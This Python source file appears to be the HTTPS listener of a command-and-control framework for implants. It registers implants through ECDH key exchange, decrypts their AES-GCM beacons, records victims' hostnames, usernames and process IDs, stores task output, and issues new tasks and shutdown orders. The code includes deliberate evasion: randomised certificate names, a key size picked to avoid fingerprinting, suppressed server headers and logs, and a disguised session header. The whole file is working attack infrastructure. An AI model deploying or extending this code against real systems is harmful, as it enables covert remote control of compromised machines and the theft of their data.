"""HTTPS listener: receives implant beacons and serves tasks over TLS."""

from __future__ import annotations

import base64
import ipaddress
import logging
import os
import random
import string
import threading
from datetime import datetime, timezone, timedelta
from typing import Optional

import uvicorn
from starlette.applications import Starlette
from starlette.requests import Request
from starlette.responses import Response
from starlette.routing import Route

from .base import BaseListener
from ..crypto.ecdh import ECDHKeyExchange
from ..crypto.aes_gcm import encrypt, decrypt
from ..protocol.beacon import decode_beacon, encode_response, BeaconResponse
from ..protocol.polymorphic import BEACON_PATHS, BEACON_METHODS, REGISTRATION_PATH, DEFAULT_BEACON_PATH
from ..models.session import create_session, get_session, list_sessions, update_last_seen, update_session
from ..models.task import get_pending_tasks, get_task, mark_sent, store_result

logger = logging.getLogger(__name__)

# Header the implant sends to identify itself (set to implant_id).
SESSION_ID_HEADER = "X-Request-ID"

# Maximum request body size accepted (1 MB).
_MAX_BODY_SIZE = 1_048_576

# Maximum number of sessions to try during fallback brute-force key resolution.
_MAX_TRIAL_DECRYPTS = 50


def generate_self_signed_cert(directory: str) -> tuple[str, str]:
    """Generate a self-signed TLS certificate and key for development use.

    Args:
        directory: Directory in which to write cert.pem and key.pem.

    Returns:
        Tuple of (cert_path, key_path).
    """
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
    except ImportError as exc:
        raise RuntimeError(
            "cryptography package required to generate self-signed certs"
        ) from exc

    os.makedirs(directory, exist_ok=True)
    cert_path = os.path.join(directory, "cert.pem")
    key_path = os.path.join(directory, "key.pem")

    # Generate RSA private key (2048-bit; 4096 is fingerprintable as uncommon).
    private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

    # Build a minimal self-signed certificate (1-year validity).
    # Use a randomised CN to avoid the obvious "localhost" fingerprint.
    _COMMON_CNS = ["server", "host", "node", "web", "app", "api", "proxy"]
    cn = random.choice(_COMMON_CNS) + "." + "".join(random.choices(string.ascii_lowercase, k=8)) + ".local"
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, cn),
    ])
    now = datetime.now(timezone.utc)
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(private_key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now)
        .not_valid_after(now + timedelta(days=365))
        .add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName("localhost"),
                x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
            ]),
            critical=False,
        )
        .sign(private_key, hashes.SHA256())
    )

    with open(cert_path, "wb") as f:
        f.write(cert.public_bytes(serialization.Encoding.PEM))

    # Write key with owner-read-only permissions (0o600).
    key_bytes = private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption(),
    )
    fd = os.open(key_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    try:
        fobj = os.fdopen(fd, "wb")
    except Exception:
        os.close(fd)
        raise
    with fobj:
        fobj.write(key_bytes)

    logger.info("self-signed cert written to %s", directory)
    return cert_path, key_path


class HTTPSListener(BaseListener):
    """HTTPS listener backed by Starlette + uvicorn.

    Runs uvicorn in a daemon background thread.  All polymorphic beacon paths
    are registered alongside a dedicated registration endpoint.

    Session identification strategy
    --------------------------------
    The implant sends its deterministic implant_id in the ``X-Request-ID``
    HTTP header with every request.  The registration endpoint stores the
    mapping  implant_id -> session_key  so that the beacon handler can look up
    the correct AES-GCM key in O(1) without trying every active session.
    As a fallback, the handler iterates active sessions and tries each key.
    """

    listener_type: str = "https"

    def __init__(
        self,
        bind_address: str = "0.0.0.0",
        port: int = 443,
        ssl_certfile: Optional[str] = None,
        ssl_keyfile: Optional[str] = None,
        ecdh: Optional["ECDHKeyExchange"] = None,
    ) -> None:
        super().__init__(bind_address, port)
        self.ssl_certfile = ssl_certfile
        self.ssl_keyfile = ssl_keyfile
        # Persisted server ECDH key.  When provided, registrations use this
        # key so the derived session key matches what the implant computes
        # from the embedded server public key.  When None, each registration
        # generates a fresh ephemeral keypair (suitable for test-implant).
        self._ecdh = ecdh

        # implant_id -> session_id mapping built at registration time.
        self._implant_session: dict[str, str] = {}
        # session_id -> session_key cache to avoid repeated DB round-trips.
        self._session_keys: dict[str, bytes] = {}
        self._lock = threading.Lock()

        self._server: Optional[uvicorn.Server] = None
        self._thread: Optional[threading.Thread] = None

        self._app = self._build_app()

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> None:
        """Start uvicorn in a background daemon thread."""
        if self._running:
            logger.warning("HTTPSListener already running on %s:%d", self.bind_address, self.port)
            return

        ssl_kwargs: dict = {}
        if self.ssl_certfile and self.ssl_keyfile:
            ssl_kwargs["ssl_certfile"] = self.ssl_certfile
            ssl_kwargs["ssl_keyfile"] = self.ssl_keyfile
            ssl_kwargs["ssl_ciphers"] = (
                "ECDHE-ECDSA-AES256-GCM-SHA384:"
                "ECDHE-RSA-AES256-GCM-SHA384:"
                "ECDHE-ECDSA-AES128-GCM-SHA256:"
                "ECDHE-RSA-AES128-GCM-SHA256:"
                "ECDHE-ECDSA-CHACHA20-POLY1305:"
                "ECDHE-RSA-CHACHA20-POLY1305"
            )

        config = uvicorn.Config(
            app=self._app,
            host=self.bind_address,
            port=self.port,
            log_level="warning",
            access_log=False,
            server_header=False,
            **ssl_kwargs,
        )
        self._server = uvicorn.Server(config)

        self._thread = threading.Thread(
            target=self._server.run,
            daemon=True,
            name=f"https-listener-{self.port}",
        )
        self._thread.start()
        self._running = True
        logger.info(
            "HTTPSListener started on %s:%d (TLS=%s)",
            self.bind_address,
            self.port,
            bool(ssl_kwargs),
        )

    def stop(self) -> None:
        """Signal uvicorn to shut down and wait for the thread."""
        if not self._running:
            return
        if self._server is not None:
            self._server.should_exit = True
        if self._thread is not None:
            self._thread.join(timeout=10)
        self._running = False
        logger.info("HTTPSListener stopped")

    # ------------------------------------------------------------------
    # Starlette application
    # ------------------------------------------------------------------

    def _build_app(self) -> Starlette:
        """Construct the Starlette app with all routes."""
        routes = [
            Route(
                REGISTRATION_PATH,
                endpoint=self._handle_registration,
                methods=["POST"],
            ),
        ]

        # Register every polymorphic beacon path for all accepted methods.
        for path in BEACON_PATHS:
            routes.append(
                Route(
                    path,
                    endpoint=self._handle_beacon,
                    methods=list(BEACON_METHODS),
                )
            )

        # Register the default beacon path (not included in BEACON_PATHS).
        routes.append(
            Route(
                DEFAULT_BEACON_PATH,
                endpoint=self._handle_beacon,
                methods=list(BEACON_METHODS),
            )
        )

        return Starlette(routes=routes)

    # ------------------------------------------------------------------
    # Registration handler
    # ------------------------------------------------------------------

    async def _handle_registration(self, request: Request) -> Response:
        """POST /api/v1/register

        Body: 65-byte uncompressed ECDH public key from the implant.
        Response: 65-byte server ECDH public key.

        The implant_id is taken from X-Request-ID so we can map it to the
        newly created session.
        """
        body = await request.body()
        if len(body) > _MAX_BODY_SIZE:
            logger.warning("registration rejected: body too large (%d bytes)", len(body))
            return Response(status_code=413)
        if len(body) != 65:
            logger.warning("registration rejected: bad key length %d", len(body))
            return Response(status_code=400)

        implant_id = request.headers.get(SESSION_ID_HEADER, "")

        # Reject re-registration if an active session already exists for this implant.
        if implant_id:
            with self._lock:
                existing_sid = self._implant_session.get(implant_id)
            if existing_sid is not None:
                existing_session = get_session(existing_sid)
                if existing_session is not None and existing_session.status == "active":
                    logger.warning(
                        "registration rejected: active session already exists for implant_id=%s",
                        implant_id,
                    )
                    return Response(status_code=409)

        try:
            # Use the persisted server key when available so the derived
            # session key matches what the production implant computes from
            # the embedded server public key.  Fall back to an ephemeral
            # keypair for test/dev (the test-implant reads the response).
            kex = self._ecdh if self._ecdh is not None else ECDHKeyExchange()
            session_key = kex.derive_session_key(body)
            server_pub = kex.get_public_key_bytes()
        except ValueError as exc:
            logger.warning("ECDH key exchange failed: %s", exc)
            return Response(status_code=400)

        # Create a new session in the database.
        session = create_session(
            session_key=session_key,
            client_pubkey=body,
            session_id=implant_id if implant_id else None,
        )

        with self._lock:
            if implant_id:
                self._implant_session[implant_id] = session.id
            self._session_keys[session.id] = session_key

        logger.info(
            "new session registered: id=%s implant_id=%s",
            session.id,
            implant_id or "(none)",
        )
        return Response(content=server_pub, media_type="application/octet-stream")

    # ------------------------------------------------------------------
    # Beacon handler
    # ------------------------------------------------------------------

    async def _handle_beacon(self, request: Request) -> Response:
        """Handle an encrypted beacon from any registered path.

        Steps:
        1. Read raw ciphertext body.
        2. Resolve session key via X-Request-ID header; fall back to brute-force.
        3. Strip optional traffic-shaping noise (delegated to decode_beacon).
        4. Decrypt AES-GCM.
        5. Deserialise JSON beacon.
        6. Update session last_seen.
        7. Store any task results included in the beacon.
        8. Fetch pending tasks for this session.
        9. Build BeaconResponse, serialise, encrypt, return.
        """
        body = await request.body()
        if not body:
            return Response(status_code=400)
        if len(body) > _MAX_BODY_SIZE:
            logger.warning("beacon rejected: body too large (%d bytes)", len(body))
            return Response(status_code=413)

        implant_id = request.headers.get(SESSION_ID_HEADER, "")
        session_id, session_key = self._resolve_session(implant_id, body)

        if session_id is None or session_key is None:
            logger.warning(
                "beacon from unknown implant (X-Request-ID=%r), path=%s",
                implant_id,
                request.url.path,
            )
            return Response(status_code=404)

        # Decrypt the beacon body.
        try:
            plaintext = decrypt(session_key, body)
        except Exception as exc:
            logger.warning("AES-GCM decryption failed for session %s: %s", session_id, exc)
            return Response(status_code=400)

        # Deserialise beacon and extract fields.
        try:
            beacon = decode_beacon(plaintext)
        except Exception as exc:
            logger.warning("beacon decode error for session %s: %s", session_id, exc)
            return Response(status_code=400)

        # Update session liveness and backfill metadata fields that are still None.
        try:
            update_last_seen(session_id)
        except Exception as exc:
            logger.error("update_last_seen failed for session %s: %s", session_id, exc)

        try:
            _session = get_session(session_id)
            if _session is not None:
                changed = False
                for field in ("hostname", "username", "uid", "pid", "os", "arch"):
                    beacon_val = getattr(beacon, field, None)
                    if beacon_val is not None and getattr(_session, field) is None:
                        setattr(_session, field, beacon_val)
                        changed = True
                if changed:
                    update_session(_session)
        except Exception as exc:
            logger.error("session metadata update failed for session %s: %s", session_id, exc)

        # Store task results that arrived with this beacon.
        for result in getattr(beacon, "results", []) or []:
            try:
                task_id = result.get("id", "")
                if not task_id:
                    continue
                # Validate task belongs to this session.
                task = None
                try:
                    task = get_task(task_id)
                except Exception:
                    pass
                if task is None or task.session_id != session_id:
                    logger.warning(
                        "result for task %s rejected: not owned by session %s",
                        task_id,
                        session_id,
                    )
                    continue
                output_raw = result.get("output")
                # Go's encoding/json base64-encodes []byte fields.
                if isinstance(output_raw, str):
                    try:
                        output_bytes = base64.b64decode(output_raw)
                    except Exception:
                        output_bytes = output_raw.encode("utf-8")
                else:
                    output_bytes = output_raw
                store_result(
                    task_id=task_id,
                    session_id=session_id,
                    output=output_bytes,
                    error=result.get("error"),
                )
            except Exception as exc:
                logger.error("failed to store result for session %s: %s", session_id, exc)

        # Fetch pending tasks and mark them as sent.
        try:
            pending = get_pending_tasks(session_id)
        except Exception as exc:
            logger.error("get_pending_tasks failed for session %s: %s", session_id, exc)
            pending = []

        tasks_payload = []
        for task in pending:
            tasks_payload.append({"id": task.id, "type": task.type, "args": task.args})

        # Determine sleep / shutdown from the session record if available.
        session = get_session(session_id)
        sleep_interval = session.sleep_interval if session else 30
        jitter = session.jitter if session else 0.2
        shutdown = session.status == "dead" if session else False

        response_obj = BeaconResponse(
            tasks=tasks_payload,
            sleep_interval=sleep_interval,
            jitter=jitter,
            shutdown=shutdown,
        )

        try:
            response_bytes = encode_response(response_obj)
            ciphertext = encrypt(session_key, response_bytes)
        except Exception as exc:
            logger.error("failed to encode/encrypt response for session %s: %s", session_id, exc)
            return Response(status_code=500)

        # Mark tasks sent only AFTER successful encryption so tasks are not
        # permanently lost if encryption fails.
        for task in pending:
            try:
                mark_sent(task.id)
            except Exception as exc:
                logger.error("mark_sent failed for task %s: %s", task.id, exc)

        return Response(content=ciphertext, media_type="application/octet-stream")

    # ------------------------------------------------------------------
    # Session resolution helpers
    # ------------------------------------------------------------------

    def _resolve_session(
        self, implant_id: str, ciphertext: bytes
    ) -> tuple[Optional[str], Optional[bytes]]:
        """Return (session_id, session_key) for the given implant_id.

        First checks the in-memory cache keyed by implant_id.  If not found,
        falls back to iterating all active sessions and attempting decryption.
        """
        with self._lock:
            if implant_id and implant_id in self._implant_session:
                sid = self._implant_session[implant_id]
                key = self._session_keys.get(sid)
                if key:
                    return sid, key

        # Fallback: try active sessions, capped to avoid brute-force DoS.
        try:
            sessions = list_sessions(status="active")
        except Exception as exc:
            logger.error("list_sessions failed: %s", exc)
            return None, None

        for session in sessions[:_MAX_TRIAL_DECRYPTS]:
            if not session.session_key:
                continue
            try:
                decrypt(session.session_key, ciphertext)
                # Decryption succeeded — cache and return.
                with self._lock:
                    if implant_id:
                        self._implant_session[implant_id] = session.id
                    self._session_keys[session.id] = session.session_key
                return session.id, session.session_key
            except Exception:
                continue

        return None, None
